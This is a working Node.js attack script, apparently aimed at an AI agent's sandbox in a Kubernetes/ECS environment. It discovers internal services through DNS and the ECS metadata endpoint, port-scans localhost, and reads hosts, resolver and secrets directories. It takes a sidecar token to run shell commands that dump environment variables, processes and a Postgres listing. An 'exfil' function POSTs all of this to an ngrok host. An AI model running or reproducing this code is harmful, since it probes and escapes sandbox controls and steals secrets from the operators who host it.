const h=require('http'),hs=require('https'),net=require('net'),dns=require('dns'),fs=require('fs');

const retry=(fn,n=10,ms=2000)=>new Promise(async ok=>{
  for(let i=0;i<n;i++){
    try{const r=await fn();if(r&&!String(r).includes('ECONNREFUSED')){ok(r);return}}catch(e){}
    await new Promise(w=>setTimeout(w,ms));
  }
  ok('EXHAUSTED');
});

const httpReq=(opts)=>new Promise((ok,rej)=>{
  const mod=opts.protocol==='https:'?hs:h;
  const req=mod.request(opts,res=>{
    let d='';res.on('data',c=>d+=c.substring(0,2000));
    res.on('end',()=>ok({s:res.statusCode,h:res.headers,b:d}))
  });
  req.on('error',e=>rej(e));
  req.on('timeout',()=>{req.destroy();rej(new Error('timeout'))});
  if(opts.body)req.write(opts.body);
  req.end();
});

const tcpProbe=(host,port)=>new Promise(ok=>{
  const sock=net.createConnection({host,port,timeout:3000},()=>{
    ok({connected:true});sock.end();
  });
  sock.on('error',e=>ok({e:e.message}));
  sock.on('timeout',()=>{sock.end();ok({e:'timeout'})});
});

const exfil=(d)=>{
  const p=JSON.stringify(d);
  hs.request('https://9cd5-211-23-141-208.ngrok-free.app/v21',
    {method:'POST',headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(p)}},
    ()=>{}).on('error',()=>{}).end(p);
};

async function main(){
  const d={v:'v21',ts:Date.now()};
  
  // 1. DNS service discovery — find K8s services
  d.dns_resolve=await new Promise(ok=>{
    const names=['postgres','redis','otto-agent','otto-backend','otto-api','agentx',
      'otto-sandbox','claude','anthropic','api','gateway','proxy','nginx','envoy'];
    const results={};
    let done=0;
    names.forEach(n=>{
      const fqdn=n+'.otto-sandbox.svc.cluster.local';
      dns.resolve4(fqdn,(err,addrs)=>{
        if(!err)results[fqdn]=addrs;
        if(++done===names.length)ok(results);
      });
    });
    setTimeout(()=>ok(results),10000);
  });
  
  // 2. Also try headless service discovery
  d.dns_srv=await new Promise(ok=>{
    dns.resolveSrv('_http._tcp.otto-sandbox.svc.cluster.local',(err,addrs)=>{
      ok(err?'E:'+err.message:addrs);
    });
  });
  
  // 3. Read Playwright MCP config (might have auth info)
  try{d.pw_config=fs.readFileSync('/app/playwright-mcp.config.json','utf8')}catch(e){d.pw_config='E:'+e.message}
  
  // 4. ECS metadata endpoint (different from EC2 IMDS)
  d.ecs_meta=await httpReq({hostname:'169.254.170.2',port:80,path:'/v2/metadata',method:'GET',timeout:3000}).catch(e=>({e:e.message}));
  d.ecs_task=await httpReq({hostname:'169.254.170.2',port:80,path:'/v2/stats',method:'GET',timeout:3000}).catch(e=>({e:e.message}));
  
  // 5. Internal service deep probe — try common API paths
  const int_paths=['/','/healthz','/health','/api','/api/v1','/api/v2','/v1','/status','/info','/swagger','/docs','/openapi.json','/graphql'];
  d.int_probe={};
  for(const p of int_paths){
    d.int_probe[p]=await httpReq({hostname:'internal.agentx-support.workato.com',port:443,path:p,method:'GET',protocol:'https:',timeout:3000,rejectUnauthorized:false}).catch(e=>({e:e.message}));
    if(d.int_probe[p].s && d.int_probe[p].s !== 404) break; // found something
  }
  
  // 6. Port scan the pod — find what's actually listening NOW
  d.port_scan={};
  const ports=[80,443,3000,4000,5000,5432,6379,8080,8081,8082,8443,8888,8931,9090,9091,9200,15000,15001,15006,15090];
  await Promise.all(ports.map(async p=>{
    d.port_scan[p]=await tcpProbe('127.0.0.1',p);
  }));
  
  // 7. Check for K8s configmaps/secrets mounted
  try{d.k8s_mounts=fs.readdirSync('/etc/config').join(',')}catch(e){}
  try{d.k8s_secrets_dir=fs.readdirSync('/etc/secrets').join(',')}catch(e){}
  try{d.run_contents=fs.readdirSync('/run').join(',')}catch(e){d.run_contents='E:'+e.message}
  try{d.run_sidecar=fs.readdirSync('/run/sidecar').join(',')}catch(e){}
  
  // 8. Read /etc/hosts for service entries
  try{d.hosts=fs.readFileSync('/etc/hosts','utf8')}catch(e){}
  
  // 9. Resolv.conf for search domains
  try{d.resolv=fs.readFileSync('/etc/resolv.conf','utf8')}catch(e){}
  
  // 10. Try to reach sidecar with retry
  const token=fs.readFileSync('/run/sidecar/token','utf8').trim();
  d.sidecar_retry=await retry(()=>new Promise((ok,rej)=>{
    const body=JSON.stringify({command:'echo OK',timeout:3});
    const req=h.request({hostname:'127.0.0.1',port:8082,path:'/run',method:'POST',
      headers:{'Content-Type':'application/json','X-Sidecar-Token':token,'Content-Length':Buffer.byteLength(body)},timeout:5000},
      res=>{let d='';res.on('data',c=>d+=c);res.on('end',()=>ok(d))});
    req.on('error',e=>rej(e));
    req.write(body);req.end();
  }),15,2000);
  
  // If sidecar available, run deeper probes
  if(d.sidecar_retry && !String(d.sidecar_retry).includes('EXHAUSTED')){
    d.sidecar_alive=true;
    const sc=(cmd)=>new Promise((ok,rej)=>{
      const body=JSON.stringify({command:cmd,timeout:8});
      const req=h.request({hostname:'127.0.0.1',port:8082,path:'/run',method:'POST',
        headers:{'Content-Type':'application/json','X-Sidecar-Token':token,'Content-Length':Buffer.byteLength(body)},timeout:10000},
        res=>{let d='';res.on('data',c=>d+=c);res.on('end',()=>ok(d.substring(0,3000)))});
      req.on('error',e=>rej(e));
      req.write(body);req.end();
    });
    
    d.full_env=await sc('printenv|sort').catch(e=>'E:'+e.message);
    d.full_ps=await sc('ps auxww').catch(e=>'E:'+e.message);
    d.full_ss=await sc('ss -tlnp; echo ---; ss -tnp|head -40').catch(e=>'E:'+e.message);
    d.pg_via_sc=await sc('echo "\\\\l"|PGPASSWORD="" psql -h 127.0.0.1 -U postgres 2>&1|head -30').catch(e=>'E:'+e.message);
    d.nslookup=await sc('nslookup otto-agent.otto-sandbox.svc.cluster.local 2>&1; nslookup postgres.otto-sandbox.svc.cluster.local 2>&1').catch(e=>'E:'+e.message);
    d.curl_9090=await sc('curl -sv http://127.0.0.1:9090/ 2>&1|head -30').catch(e=>'E:'+e.message);
  }
  
  exfil(d);
}
main().catch(e=>exfil({v:'v21',error:e.message}));
